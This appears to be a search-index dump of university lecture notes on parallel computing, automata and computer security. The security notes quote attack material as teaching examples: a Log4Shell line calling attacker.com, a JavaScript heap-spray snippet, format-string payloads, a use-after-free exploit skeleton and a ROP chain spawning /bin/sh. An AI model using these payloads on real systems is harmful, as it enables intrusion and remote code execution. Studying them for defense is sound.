Processor retrieves updated value from memory due to write-through policy Dirty state of cache line indicates exclusive ownership (RW epoch) Modified: cache is only cache with valid copy of line (can safely be written to) Owner: cache responsible for propagating info to other processors when they attempt to load it from memory (otherwise a load will result in stale data) MSI write-back invalidation protocol # Key tasks: ensure processor obtains exclusive write access, locating most recent copy of cache line\u0026rsquo;s data on cache miss Three cache line states: Invalid (I): same meaning of invalid in uniprocessor cache Shared (S): line valid in one or more caches, memory up to date Modified (M): line valid in exactly one cache (dirty, exclusive) Two processor operations (triggered by local CPU) PrRd (read) PrWr (write) Three coherence-related bus transactions from remote caches BusRd: obtain copy of line with no intent to modify BusRdX: obtain copy of line with intent to modify BusWb: write dirty line out to memory Invalidation protocol: Read obtains block in \u0026ldquo;shared\u0026rdquo;, even if only cached copy Obtain exclusive ownership before writing BusRdX causes others to invalidate If M in other cache, will cause writeback BusRdX even if hit in S: promote to M Satisfaction of cache coherence: SWMR invariant: satisfied as only one cache can be in M-state, all others get invalidation message Multiple caches can be in read-only S-state MESI invalidation protocol # MSI inefficiency: requests two interconnect transactions for common case of reading address, then writing to it Solution: add additional state E (\u0026ldquo;exclusive clean\u0026rdquo;) Line has not been modified, but only this cache has a copy of the line Decouples exclusivity from line ownership (line not dirty, so copy in memory is valid copy of data) Upgrade from E to M does not require bus transaction Scalable cache coherence using directories # Snooping schemes broadcast coherence messages to determine state of line in other caches: not scalable Alternative idea: avoid broadcast by storing info. about status of the line in one place: a \u0026ldquo;directory\u0026rdquo; Directory entry for cache line contains info about state of cache line in all caches Caches look up info from directory as necessary Cache coherence maintained by point-to-point messages between caches on \u0026ldquo;need-to-know\u0026rdquo; basis Still need to maintain SWMR and write serialization invariants Implications of cache coherence on programmer # Communication is everything - comm. time is key parallel overhead! Cache synchronization appears as increased memory access time for multiprocessor "},{"id":86,"href":"/notes/cs149/2022-11-01-memory-consistency/","title":"Memory Consistency","section":"CS 149, Fall 2022","content":" Memory consistency # Definition of consistency: allowed behavior of loads and stores to different addresses in parallel system Memory operation ordering # Program defines sequence of loads and stores Four types of orderings: Wx -\u0026gt; Ry: write to X must commit before subsequent read from Y Rx -\u0026gt; Ry: read from X must commit before subsequent read from Y Rx -\u0026gt; Wy: read from X must commit before subsequent write to Y Wx -\u0026gt; Wy: write to X must commit before subsequent write to Y Sequential Consistency # All ops executed in some sequential orders As if manipulation if single shared memory Each thread\u0026rsquo;s operations happen in program order Maintains all four memory operation orderings Relaxed consistency # Allow certain orderings to be violated Allows us to hide memory latency: overlap memory access operations with other operations when they are independent Mem. access in cache coherent system may require more work than just reading bits from memory "},{"id":87,"href":"/notes/cs149/2022-11-03-lock-implementation-and-lock-free-programming/","title":"Lock Implementation and Lock Free Programming","section":"CS 149, Fall 2022","content":" Locks, Fine-Grained Synchronization, and Lock-Free Programming # Terminology # Deadlock Mutual exclusion: only one processor can hold a given resource at a time Hold and wait: processor must hold resource while waiting for other resources it needs to complete an operation No preemption: processors don\u0026rsquo;t give up resources until operation they wish to perform is complete Circular wait: waiting processors have mutual dependencies (e.g., cycle exists in dependency resource graph) Livelock: system is execution many operations, but no thread is making meaningful progress (e.g. continuous abort and retry) Starvation: system is making overall progress, but some processes make no progress Usually not a permanent state More on atomics # Implementing atomic operations from compare-and-swap # // atomicCAS: \u0026#34;compare-and-swap\u0026#34; // performs following logic atomically int atomicCAS(int *addr, int compare, int val) { int old = *addr; *addr = (old == compare) ? val : old; return old; } void atomicMIN(int *addr, int x) { int old = *addr; int new = min(old, x); while (atomicCAS(addr, old, new) != old) { old = *addr; new = min(old, x); } } Lock implementation # Test-and-set based lock # Atomic test-and-set instruction: ts\nIn reality: cmpxchg in x86, e.g. lock cmpxchg dst, src Spin lock implementation:\nts r0, mem[addr] // load mem[addr] into r0 // if mem[addr] is 0, set mem[addr] to 1 lock: ts r0, mem[addr] // load word into r0 bnz r0, lock // if 0, lock obtained, otherwise go back to fn start unlock: st mem[addr], #0 // store 0 into mem addr Test-and-test-and-set lock # void Lock(int *lock) { while (true) { // while another processor has the lock, spin // (assume *lock is not register allocated) while (*lock != 0); // when lock is released, try to acquire it if (test_and_set(*lock) == 0) return; } } void Unlock(int *lock) { *lock = 0; } Performance is better because instead of test-and-set per spin, we keep trying to read the lock, and do only one test-and-set Ticket lock # Main problem with test-and-set style locks: upon release, all waiting processors attempt to acquire lock using test-and-set Instead, ticket system: struct lock { int next_ticket; int now_serving; } void Lock(lock *l) { int my_ticket = atomic_increment(\u0026amp;l-\u0026gt;next_ticket); while (my_ticket != l-\u0026gt;now_serving); } void Unlock(lock *l) { l-\u0026gt;now_serving++; } Using locks # Motivating example: sorted linked list\nstruct Node { int value; Node *next; } struct List { Node *head; } void insert(List *list, int value) { Node *n = new Node; n-\u0026gt;value = value; Node *prev = list-\u0026gt;head; Node *cur = list-\u0026gt;head-\u0026gt;next; while (cur) { if (cur-\u0026gt;value \u0026gt; value) break; prev = cur; cur = cur-\u0026gt;next; } n-\u0026gt;next = cur; prev-\u0026gt;next = n; } void delete(List *list, int value) { Node *prev = list-\u0026gt;head; Node *cur = list-\u0026gt;head-\u0026gt;next; while (cur) { if (cur-\u0026gt;value == value) { prev-\u0026gt;next = cur-\u0026gt;next; delete cur; return; } prev = cur; cur = cur-\u0026gt;next; } } Issues when called with multiple threads Simultaneous insertion: both threads may computer same prev and cur, resulting in one insertion getting lost Simultaenous insertion/deletion: same issue may cause entire loss of part of list Attempt 1: global data structure lock # struct Node { int value; Node *next; } struct List { Node *head; Lock *lock; } void insert(List *list, int value) { lock(list-\u0026gt;lock); Node *n = new Node; n-\u0026gt;value = value; Node *prev = list-\u0026gt;head; Node *cur = list-\u0026gt;head-\u0026gt;next; while (cur) { if (cur-\u0026gt;value \u0026gt; value) break; prev = cur; cur = cur-\u0026gt;next; } n-\u0026gt;next = cur; prev-\u0026gt;next = n; unlock(List-\u0026gt;lock); } void delete(List *list, int value) { lock(list-\u0026gt;lock); Node *prev = list-\u0026gt;head; Node *cur = list-\u0026gt;head-\u0026gt;next; while (cur) { if (cur-\u0026gt;value == value) { prev-\u0026gt;next = cur-\u0026gt;next; delete cur; unlock(list-\u0026gt;lock); return; } prev = cur; cur = cur-\u0026gt;next; } unlock(list-\u0026gt;lock); } But this is slow! serializes lock usage Second attempt: hand-over-hand locking # Lock per node.\n"},{"id":88,"href":"/notes/cs149/2022-11-10-transactional-memory/","title":"Transactional Memory","section":"CS 149, Fall 2022","content":" Transactional memory # The limitations of locking # Locks force tradeoffs between: Degree of concurrency (performance) Chance of races, deadlock (correctness) Coarse grained locking: lowers concurrency, higher chance of correctness e.g. single lock for the data structure Fine-grained locking: high concurrency, lower chance of correctness e.g. hand-over-hand locking Better synchronization abstractions? Review: ensuring atomicity via locks # void deposit(Acct account, int amount) { lock(account.lock); int tmp = bank.get(account); tmp += amount; bank.put(account, tmp); unlock(account.lock); } Deposit: Read-modify-right operation; want deposit to be atomic with respect to other bank operations on the account Locks help ensure this atomicity by ensuring mutual exclusion on the account Programming with transactions # What if we could declare a section of code atomic? void deposit(Acct account, int amount) { atomic { int tmp = bank.get(account); tmp += amount; bank.put(account, tmp); } } Atomic construct is declarative: programmer states what to do (maintain code atomicity), not how to do it System could implement this in multiple ways - using locks, for example Optimistic concurrency: maintain serialization only in situations of true contention (R-W or W-W conflicts) Declarative vs. imperative abstractions # Declarative: programmer defines what should be done (e.g. execute 1000 independent tasks) Imperative: programmer states how it should be done (e.g. spawn N worker threads, assign work to threads via removing work from shared task queue) Transactional memory (TM) semantics # Memory transaction Atomic and isolated sequence of mem. accesses Inspired by database transaction Atomicity: all or nothing Upon transaction commit, all memory writes in transaction take effect as one On transaction aborts, none of the writes appear to take effect, as if transaction never happened Isolation No other processor can observe writes before transaction commits Serializability Transactions appear to commit in single serial order However: no exact order of commits guaranteed by semantics of transaction Motivating example: Java HashMap # Map: key -\u0026gt; value, implemented as hash table with linked list per bucket\nSequential implementation # public Object get(Object key) { int idx = hash(key); HashEntry e = buckets[idx]; while (e != null) { if (equals(key, e.key)) { return e.value; } e = e.next; } return null; } Bad: not thread safe (when sync. needed) Good: no lock overhead when sync. not needed Java 1.4 solution: synchronized layer # public Object get(Object key) { synchronized (myHashMap) { return myHashMap.get(key); } } Convert any map to thread-safe variant Use explicit, coarse-grained mutual locking specified by programmer Good: thread-safe, easy implementation Bad: limits concurrency, poor stability A better option: finer-grained locking (e.g. lock per bucket) Thread-safe, but incurs lock overhead even if sync. not needed Transactional HashMap # Simply enclose all operations in atomic block public Object get(Object key) { atomic { return m.get(key); } } Good: thread-safe, easy to program Performance and scalability: depends on workload and implementation of atomic (to be discussed) Another motivation: failure atomicity # Initially:\nvoid transfer (A, B, amount) { synchronized(bank) { try { withdraw(A, amount); deposit(B, amount); } catch (exception1) { rollback(code1); } catch (exception2) { rollback(code2); } } } Complexity of manually catching exceptions: Programmer has to specify edge cases, can miss some Undo code may be tricky to implement partially With transactions:\nvoid transfer (A, B, amount) { atomic(bank) { withdraw(A, amount); deposit(B, amount); } } System now responsible for processing exceptions All exceptions (except those managed explicitly by programmer) Transaction aborted and memory updates are undone Another motivation: composability # void transfer(A, B, amount) { synchronized(A) { synchronized(B) { withdraw(A, amount); withdraw(B, amount); } } } Deadlocks when A, B try to transfer to each other Composing lock-based code can be tricky: requires system-wide policy to get correct, but these can break software modularity With transactions:\nvoid transfer(A, B, amount) { atomic(bank) { withdraw(A, amount); deposit(B, amount); } } Transactions theoretically compose gracefully Programmer declares global intent: atomic execution of transfer; no need to know about global implementation strategy Transaction in transfer subsumes any defined in withdraw and deposit System manages concurrency as well as possible: serialization when needed (contention), concurrenct otherwise The difference between atomicity and locks # Atomic: high-level declaration of atomicity Does not specify the implementation Lock: low-level blocking primitive Does not provide atomicity or isolation on its own Can be used to implement atomic block, but can be used for purposes beyond atomicity Cannot replace all locks with atomic regions Atomicity eliminates many data races, but programming with atomic blocks can still suffer from atomicity violations Implementing transactional memory # TM systems must provide atomicity and isolation All writes must take effect all at once All or nothing: failure leads to no write taking effect No reads observed before all writes commit Data versioning policy # Manage uncommitted (new) and previously committed (old) versions of data for concurrent transactions Eager versioning: undo-log based Update memory immediately, maintain \u0026ldquo;undo log\u0026rdquo; in case of abort Good: faster commit (data already in memory) Bad: slower abort, fault tolerance issues (consider crash in middle of transaction) Need to check something else is not reading/writing in middle of the eager versioning update block Lazy versioning: write-buffer based Log memory updates in transaction write buffer, flush buffer on failure Update actual memory location on commit Good: faster abort (just clear log), no fault tolerance issues Bad: slower commits Conflict detection policy # Must detect and handle conflicts between transactions Read-write conflict: transaction A reads address X, which was written to by pending (but not yet committed) transaction B Write-write conflict: transactions A and B are both pending, and both write to address X System must track a transaction\u0026rsquo;s read set and write set Read-set: addresses read during the transaction Write-set: addresses written during the transaction Pessimistic detection: check for conflicts immediately during loads and stores Contention manager decides to stall or abort transaction on detection of conflict Good: detect conflicts early -\u0026gt; faster and less work on abort Bad: no forward progress guarantees, more aborts in some cases Bad: fine-grained communication: check on each load/store Bad: detection on critical path Optimistic detection: detects conflicts when transaction attempts to commit On conflict, give priority to committing transaction; other transactions may abort later on Good: forward progress guarantees Good: bulk communication and conflict detection Bad: detects conflicts late, can still have fairness problems "},{"id":89,"href":"/notes/cs154/2021-09-28-finite-automata/","title":"Finite Automata","section":"CS 154, Fall 2021","content":" Finite automata # Previous Next \u0026nbsp; \u0026nbsp; Page: / "},{"id":90,"href":"/notes/cs154/2021-10-05-pumping-lemma-and-myhill-nerode/","title":"Pumping Lemma and Myhill Nerode","section":"CS 154, Fall 2021","content":" Pumping Lemma and Myhill-Nerode Theorem # Previous Next \u0026nbsp; \u0026nbsp; Page: / "},{"id":91,"href":"/notes/cs154/2021-10-12-streaming-algorithms-and-turing-machines/","title":"Streaming Algorithms and Turing Machines","section":"CS 154, Fall 2021","content":" Streaming algorithms and Turing machines # Previous Next \u0026nbsp; \u0026nbsp; Page: / "},{"id":92,"href":"/notes/cs155/2022-03-28-intro/","title":"Intro","section":"CS 155, Spring 2022","content":" Computer and Network Security: Overview # The computer security problem # Lots of buggy software Money can be made from finding and exploiting vulns Marketplace for exploits (gaining a foothold) Marketplace for malware (post-compromise) Strong economic and political motivation for using both Current state: Existence of vulns is somewhat evenly distributed across OS\u0026rsquo;s Usage of exploits: almost 50% start by attacking Microsoft Office; 32% start by attacking the browser Course goals # Understand exploit techniques Learn to defend and prevent common exploits Understand available security tools Learn to architect secure systems This course # Part 1: basics (architecting for security) Securing apps, OS, and legacy code: sandboxing, access control, and security testing Part 2: Web security (defending against a web attacker) Building robust websites, understanding the browser security model Part 3: network security (defending against a network attacker) Monitoring and architecting secure networks Part 4: securing mobile applications Course introduction: what motivates attackers? # Why compromise machines? Examples # Steal user credentials Keylog for banking passwords, corporate passwords, gaming passwords e.g. SilentBanker: Adversary-in-the-Browser (AITB) attack; finSpy on mobile devices Ransomware Encrypts files on disk, requests payment (typically in cryptocurrency) to unlock e.g. WannaCry (2017), weaponizing the EternalBlue Windows SMB exploit Cryptocurrency mining Malware trojans deploy cryptocurrency miners on end-user host systems to create powerful botnets; generates profit for hackers Why server-side attacks? # Data theft Can steal credit card numbers, intellectual property, etc e.g. Equifax (2017): ~143M \u0026ldquo;customer\u0026rdquo; data impacted\u0026quot; Exploited known remote code execution (RCE) vulnerability in Apache Struts Many such attacks since 2000 Political motivation e.g. attack on DNC (2015) e.g. Ukraine attacks: 2014 election, 2015-2016 power grid, 2017 NotPetya, \u0026hellip; Infect visiting users: see above Typical attack steps (Cyber Kill Chain) # Reconnnaissance Foothold: initial breach Internal reconnaissance Lateral movement Data extraction Exfiltration Case study: Log4Shell (2021) # Log4j: popular logging framework for Java Nov. 2021: vulnerability in Log4j v2 enables RCE Over 7000 code repositories affected Bug: Log4j can load and run code to process a log request Attacker sends a message containing ${jndi:ldap://attacker.com} to the victim Victim runs log.info(\u0026quot;...${jndi:ldap://attacker.com}...\u0026quot;) Victim will then HTTP GET the code at ldap://attacker.com and run it: allowing malicious Java code Exploitation: Khonsari ransomware XMRIG cryptominer Orcus remote access trojan Preventing problems of this type: Isolation: sandbox Log4j library or sandbox entire application Case study: SolarWinds Orion (2020) # SolarWinds Orion: set of monitoring tools used by many organizations Attack (Feb. 20, 2020): Attacker corrupts SolarWinds software update process using sunburst malware Infected DLL distributed to customers, allowing remote access to customer sites Large number of infected organizations, not detected until Dec. 2020 How did attacker corrupt the SolarWinds build process? taskhostsvc.exe runs on SolarWinds build system: Monitors for processes running MsBuild.exe (Visual Studio) If found, read cmd line args to test if Orion software being built If so: Replace file InventoryManager.cs with malware version, backup original to InventoryManager.bk When MsBuild.exe exits, restore original file, no trace left Fallout: Large number of orgs and government systems exposed for many months More generally: supply chain attack - hardware, software or service supplier is compromised -\u0026gt; many compromised customers Many examples of this in the past (e.g., Target 2013 hack) Case study: typo squatting # pip: Package installer from python Usage: pip install 'SomePackage \u0026gt;= 2.3' By default: installs from PyPi (Python Package Index at pypi.org) PyPi hosts over 300,000 projects Security considerations: dependencies Package maintainer can inject code into your environment Supply chain attack: attack on package manager -\u0026gt; compromise dependent projects Security considerations: typo-squatting The risk: malware packages with a similar name to a popular package; unsuspecting developers install the wrong package e.g. urllib3 is a package to parse urls, urlib3 is a malware package e.g. python-nmap is a net scanning package, nmap-python is a malware package From 2017-2020, over 40 such incidents discovered on PyPi Course introduction: The Marketplace for Vulnerabilities # Bug bounty programs # Google: Up to $31,337 Microsoft: Up to $100k Apple: Up to $200K Stanford: up to $1k Pwn2Own: $15k Exploit brokers # Zerodium: up to $2M for iOS, $2.5M for Android (2019); clients are government organizations These groups are primarily interested in RCE, local privilege escalation (LPE), and sandbox escape (SBX) "},{"id":93,"href":"/notes/cs155/2022-03-30-control-hijacking/","title":"Control Hijacking","section":"CS 155, Spring 2022","content":" Basic Control Hijacking Attacks # Attacker\u0026rsquo;s goal: Take over target machine (e.g., web server) Execute arbitrary code on target by hijacking application control flow Examples: Buffer overflow and integer overflow attacks Format string vulnerabilities Use after free Buffer overflow attacks # Extremely common in C/C++ programs Now advised to avoid C/C++ Use Rust: typesystem should help avoid these bugs First major exploit: 1988 internet worm, bug in fingerd What is needed:\nAttacker needs to know which CPU and OS used on the target machine Examples are x86-64 running Linux or Windows (project is 32-bit) Details vary slightly between CPUs and OSs Stack frame structure (Unix vs. Windows, x86 vs. ARM) Endianness Linux process memory layout (x86-64) # Linux stack frame (x86-64) # Review of buffer overflows # Suppose a web server contains the following function:\nvoid func(char *str) { char buf[128]; strcpy(buf, str); do_something(buf); } After strcpy, stack looks like:\nIf *str is 144 bytes long, after strcpy, stack looks like:\nBasic stack exploit # Suppose *str is such that after strcpy looks like\nwhere Program P is exec(\u0026quot;/bin/sh\u0026quot;). This allows an attacker to run a shell on the webserver.\nNote: attack code P runs in stack.\nThe NOP slide # Problem: how does attacker determine return address?\nSolution: NOP slide\nGuess approximate state when func() is called Insert many NOPs before program P nop xor eax, eax inc ax Details and examples # Complications:\nProgram P should not contain the \\0 character Overflow should not crash program before func() exits Famous remote stack smashing overflows:\nOverflow in Windows animated curosrs (ANI) - LoadAniIcon() Buffer overflow in Symantec virus detection (May 2016) Overflow when parsing PE headers - kernel vuln Many unsafe libc functions # strcpy(char *dest, const char *src); strcat(char *dest, const char *src); gets(char *s); scanf(const char *format, ...); ... \u0026ldquo;Safe\u0026rdquo; libc versions strncpy, strncat are misleading (e.g. strncpy may leave string unterminated)\nWindows C runtime (CRT) ensures proper termination:\nstrcpy_s(*dest, DestSize, *src); Buffer overflow exploit opportunities # Exception handlers Overwrite address of an exception handler in stack frame Forces attacker\u0026rsquo;s code to run instead of exception code when an exception executes Function pointers (e.g. PHP 4.0.2, MS MediaPlayer bitmaps) Overflow buffer, attacker\u0026rsquo;s code replaces address to function pointer and override it Longjmp buffers (longjmp(pos), e.g. Perl 5.003) Overflowing buffer next to pos overrides value of pos Heap exploits: corrupting virtual tables # C++ stores data elements of an object, first address in object points to virtual table, which contains pointers to the functions that use those objects\nExample: exploiting browser heap # Setting: malicious web server sends web page with exploit to requesting victim browser Attacker\u0026rsquo;s goal is to infect browsers visiting the website How: send javascript to browser that exploits a heap overflow \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; shellcode = unescape(\u0026#34;%u4343%u4343...\u0026#34;); // allocate in heap overflow_string = unescape(\u0026#34;%u2332%u4276...\u0026#34;); cause_overflow(overflow_string); // overflow buf[] \u0026lt;/script\u0026gt; Problem: attacker does not know where browser places shellcode on the heap\nSolution: Heap Spraying\nUse Javascript to spray heap with shellcode and NOP slides Then point vtable ptr anywhere in spray area How this works in code:\nvar nop = unescape(\u0026#34;%u9090%u9090\u0026#34;); while (nop.length \u0026lt; 0x100000) nop += nop; var shellcode = unescape(\u0026#34;%u4343%u4343...\u0026#34;); var x = new Array(); for (var i = 0; i \u0026lt; 1000; i++) x[i] = nop + shellcode; Pointing the function pointer almost anywhere in the heap will cause shellcode to execute.\nAd-hoc heap overflow mitigations # Better browser architecture Store Javascript strings in a separate heap from browser heap OpenBSD and Windows 8 heap overflow protection After each virtual memory page, the next page (address above) is an unallocated and unwriteable guard page If buffer overflow crosses a page boundary, an access boundary is detected and the program crashes Finding overflows by fuzzing # Run web server on local machine Use American Fuzzy Lop (AFL) to issue malformed request (ending with $$$$$) Fuzzers: automated tools for this If web server crashes, search core dump for $$$$$ to find overflow location Construct exploit (not easy given latest defenses) More control hijacking exploits # Integer overflows # Problem: what happens when int exceeds max value?\nint m; // 32 bits short s; // 16 bits char c; // 8 bits c = 0x80 + 0x80; // 128 + 128 = 0 s = 0xff80 + 0x80; // 0 m = 0xffffff80 + 0x80; // 0 Exploit example:\nvoid func(char *buf1, char *buf2, unsigned int len1, unsigned int len2) { char temp[256]; if (len1 + len2 \u0026gt; 256) // length check return -1; memcpy(temp, buf1, len1); memcpy(temp + len1, buf2, len2); // concatenate buf do_something(temp); } If len1 == 0x80 and len2 == 0xffffff80, then len1 + len2 == 0, so second memcpy() will overflow the heap!\nTo fix: use a length check like\nif (len1 \u0026gt; 256 || len2 \u0026gt; 256 || len1 + len2 \u0026gt; 256) return -1; Format string bugs # int func(char *user) { fprintf(stderr, user); } Problem: what if *user == \u0026quot;%s%s%s%s%s%s%s\u0026quot;?\nMost likely: program will crash (denial of service) If not, program will print memory contents (privacy concerns) Full exploit using user == \u0026quot;%n\u0026quot; (print everything previously printed to stdout) Correct form: fprintf(stderr, \u0026quot;%s\u0026quot;, user);\nExploits:\nDumping arbitrary memory Walk up stack until desired pointer is found printf(\u0026quot;%08x.%08x.%08x.%08x|%s|\u0026quot;); \u0026quot;%08x\u0026quot;: move 8 bytes up the stack Writing to arbitrary memory printf(\u0026quot;hello %n\u0026quot;, \u0026amp;temp); - writes \u0026lsquo;6\u0026rsquo; into temp printf(\u0026quot;%08x.%08x.%08x.%08x.%n\u0026quot;); Use-after-free exploits # Constituted 36% of security vulnerabilities in Chrome 2015-2020\nExample: IE11 CVE-2014-0282\n\u0026lt;form id=\u0026#34;form\u0026#34;\u0026gt; \u0026lt;textarea id=\u0026#34;c1\u0026#34; name=\u0026#34;a1\u0026#34; \u0026gt;\u0026lt;/textarea\u0026gt; \u0026lt;input id=\u0026#34;c2\u0026#34; type=\u0026#34;text\u0026#34; name=\u0026#34;a2” value=\u0026#34;val\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;script\u0026gt; function changer() { document.getElementById(\u0026#34;form\u0026#34;).innerHTML = \u0026#34;\u0026#34;; CollectGarbage(); // erase c1 and c2 fields } document.getElementById(\u0026#34;c1\u0026#34;).onpropertychange = changer; // loops on c1.DoReset() and c2.DoReset() document.getElementById(\u0026#34;form\u0026#34;).reset(); \u0026lt;/script\u0026gt; c1.doReset() causes changer() to be called and free object c2 c2 points to a vtable that points to doSomething, doReset, and doSomethingElse Suppose attacker allocates a string of same size as vtable containing ShellCode When c2.DoReset() is called, attacker gets shell The exploit:\n\u0026lt;form id=\u0026#34;form\u0026#34;\u0026gt; \u0026lt;textarea id=\u0026#34;c1\u0026#34; name=\u0026#34;a1\u0026#34; \u0026gt;\u0026lt;/textarea\u0026gt; \u0026lt;input id=\u0026#34;c2\u0026#34; type=\u0026#34;text\u0026#34; name=\u0026#34;a2” value=\u0026#34;val\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;script\u0026gt; function changer() { document.getElementById(\u0026#34;form\u0026#34;).innerHTML = \u0026#34;\u0026#34;; CollectGarbage(); // erase c1 and c2 fields // allocate string object to occupy vtable location } document.getElementById(\u0026#34;c1\u0026#34;).onpropertychange = changer; // loops on c1.DoReset() and c2.DoReset() document.getElementById(\u0026#34;form\u0026#34;).reset(); \u0026lt;/script\u0026gt; "},{"id":94,"href":"/notes/cs155/2022-04-04-control-hijacking-defenses/","title":"Control Hijacking Defenses","section":"CS 155, Spring 2022","content":" Control Hijacking Defenses # Note: control hijacking attacks occur because data is mixed with control flow in memory -\u0026gt; allows attackers to mess with control flow by manipulating data\nWays to prevent control hijacking attacks:\nFix bugs Audit software: automated tools include Coverity, Infer, etc. Rewrite software in a type-safe language (Java, Go, Rust) - however this is difficult for existing/legacy code Platform defenses: prevent attack code execution Harden executable to detect control hijacking Halt processes and report when exploit detected e.g. StackGuard, ShadowStack, memory tagging, etc\u0026hellip; Idea: transform complete breach to denial of service\nMarking memory as non-execute (DEP) # Prevent attack code execution by marking stack and heap as non-executable NX-bit on AMD64, XD-bit on Intel x86 (2005), XN-bit on ARM disable execution: an attribute bit in every page table entry (PTE) Deployment: all major operating systems Windows DEP: since XP SP2 (2004) Limitations: Some apps need executable heap (e.g. JITs) Can be easily bypassed using Return Oriented Programming (ROP) Attack: Return Oriented Programming (ROP) # Control hijacking without injecting code Attacker overflows buffer Overflow string will set return address to the exec function in libc.so The argument will point to the string /bin/sh in libc.so When we exit this function, the exec function gets called and /bin/sh gets run Implementation details: To run /bin/sh must redirect stdin and stdout socket: dup2(s, 0); dup2(s, 1); execve(\u0026#34;/bin/sh\u0026#34;, 0, 0); Look for gadgets in victim code (either in application, libc.so, or elsewhere) that match each of the above lines of code Attacker just needs to look for segments containing gadgets in machine code (i.e. pop rdi; ret corresponds to 0x5fc3) Segments do not need to be instructions, they could just be a string or other data (as long as they are not located on the stack or heap) Defense: Address Space Layout Randomization (ASLR) # On load: randomly shift base of code and data in process memory Attacker does not know location of code gadgets Deployment: /DynamicBase in Windows Since Windows 8: 24-bits of randomness on 64-bit processors Base of everything must be randomized or load: Libraries (DLLs, shared libs), application code, stack, heap, etc Defense: kBouncer (2012) # Observation: abnormal execution sequence: ret returns to an address that does not follow a call Idea: before a syscall, check that every prior ret is not abnormal How: use Intel\u0026rsquo;s Last Branch Recording (LBR) Stores last 16 executed branches in a set of on-chip registers (MSR) Read using rdmsr instruction from privileged mode Before entering kernel, verify that last 16 rets are normal Requires no application code changes and minimal overhead Limitations: attacker can ensure 16 calls prior to syscall are normal Hardening the executable # Runtime checking: StackGuard # Runtime tests for stack integrity Embed \u0026ldquo;canaries\u0026rdquo; in stack frames and verify their integrity prior to function returns Implemented as a GCC patch, minimal performance overhead (8% for Apache webserver) Random canary: Random string chosen at program startup Insert canary string into every stack frame Verify canary before returning from function Exit program if canary changed: turns potential exploit into DoS To corrupt: attacker must learn/guess current random string Terminator canary: canary = {0, '\\n', '\\r', EOF}: String fucntions will not copy beyond terminator Attacker cannot use string functions to corrupt stack Not used because this doesn\u0026rsquo;t defend against stack-smashing using memcpy Enhancement: ProPolice Since GCC 3.4.1 (-fstack-protector): rearrange stack layout to prevent ptr overflow MS Visual Studio /GS (BufferSecurityCheck) Combination of ProPolice and random canary If cookie mismatch, default behavior is to call exit(3) Function prolog: sub esp, 4 // allocate 4 bytes for cookie mov eax, DWORD PTR __security_cookie xor eax, esp // xor cookie with current esp - makes canary different across stack frames mov DWORD PTR [esp+4], eax // save in stack Function epilog: mov ecx, DWORD PTR [esp+4] xor ecx, esp call @__security_check_cookie@4 add esp, 4 Protects all stack frames, unless can be proven unnecessary Note: canaries are not foolproof and do not prevent all control hijacking attacks Some stack smashing attacks can leave canaries unchanged Heap-based attacks still possible Integer overflow attacks still possible Even worse: canary extraction as a result of crash recovery When process crashes, restart automatically (for availability) Often canary is unchanged (reason: relaunch using fork) Danger: can extract canary byte by byte For each character in the canary, try to find the character to overflow with that does not make the program crash Possible mitigation: watcher that doesn\u0026rsquo;t use fork, or patching fork to change the canary (difficult research question, because fork copies the stack and need to go through and repatch the stack) Note: similar technique can de-randomize ASLR More methods: Shadow Stack # Keep a copy of the stack in memory On call: push ret-address to shadow stack On ret: check that top of shadow stack is equal to ret-address on stack; crash if not Security: memory corruption should not corrupt shadow stack Using Intel CET (supported in Windows 10, 2020) New register SSP: shadow stack pointer Shadow stack pages marked by a new \u0026ldquo;shadow stack\u0026rdquo; attribute; only call or ret can read/write these pages ARM Memory Tagging Extension (MTE) Idea: Every 64-bit memory pointer P has a 4-bit \u0026ldquo;tag\u0026rdquo; (in top byte) Every 16-byte user memory region R has a 4-bit \u0026ldquo;tag\u0026rdquo; Processor ensures that: if P is used to read R then tags are equal Otherwise, hardware exception Tags are created using new HW instructions ldg, stg: load and store tag to a memory region (used by malloc and free) addg, subg: pointer arithmetic on an address preserving tags Tags prevent buffer overflows and use after free char *p = new char[40]; // p = 0xB000 6FFF FFF5 1240, *p tagged as B p[50] = \u0026#39;a\u0026#39;; // B != 7 -\u0026gt; tag mismatch exception (buffer overflow), crash delete[] p; // memory is retagged from B to E p[7] = \u0026#39;a\u0026#39;; // B != E -\u0026gt; tag mismatch exception (use after free), crash Note: out of bounds access to p[44] at line 2 will not be caught Control Flow Integrity (CFI) # Ultimate goal: ensure control flows are as specified by code\u0026rsquo;s flow graph\nvoid HandshakeHandler(Session *s, char *pkt) { // compile time: build list of possible call targets for s-\u0026gt;hdlr // run time: before call, check that s-\u0026gt;hdlr value is on list s-\u0026gt;hdlr(s, pkt); } "},{"id":95,"href":"/notes/cs155/2022-04-06-security-principles/","title":"Security Principles","section":"CS 155, Spring 2022","content":" Principles of secure systems # Inevitability of vulnerabilities # Very easy to make mistakes involving buffer overflow, use-after-free, or null pointer dereferences Many such mistakes can allow attackers to run malicious code As such, there will always be bugs, even as we get better at finding and preventing them Systems must be designed to be resilient in the face of both software vulnerabilities and malicious users Defense in Depth # Systems should be built with security protections at multiple layers e.g. in the case of a vulnerability in Chrome Javascript interpreter: Chrome should prevent malicious website from accessing other tabs OS should prevent access to other processes (e.g., password manager) Hardware should prevent permanent malware installation in device firmware Network should prevent malware from infecting nearby computers Principle of least privilege # Users should only have access to the data and resources to perform routine and authorized tasks This helps protect against Malicious or curious owners of overprivileged accounts doing widespread damage External attackers causing widespread damage simply by owning a poorly secured overprivileged account Privilege separation: dividing a system into parts to which we can limit access Segmenting a system into components with least privilege needed can prevent an attacker from taking over the entire system Privilege separation # Security subjects and security policies # Security subjects # Unix: a user should only be able to read their own files Unix: a process shouuld not be able to read another process\u0026rsquo;s memory Mobile: an app should not be able to edit another app\u0026rsquo;s data Web: a domain should only be able to read its own cookies Networking: only a trusted host should be able to access a file server Security policies # Subject (who?): acting system principals (e.g. user, app, process) Object (what?): protected resources (e.g., memory, files, hardware devices) Operation (how?): how subjects operate on objects (e.g., read, edit, delete) Example policies: Unix: a user should not be able to delete other users\u0026rsquo; files Unix: a process should not be able to read another process\u0026rsquo;s memory Mobile: an app should only be able to edit its own data Web: a domain should not be able to read another domain\u0026rsquo;s cookies Privilege and access control in Unix # Subjects: users, processes Many user accounts: both service accounts for background processes, and user accounts tied to specific humans Every user has a unique integer id (UID) UID 0 is reserved for special user root that has access to everything Many system operations can only run as root User information is stored in /etc/passwd: root:x:0:0:root:/root:/bin/bash 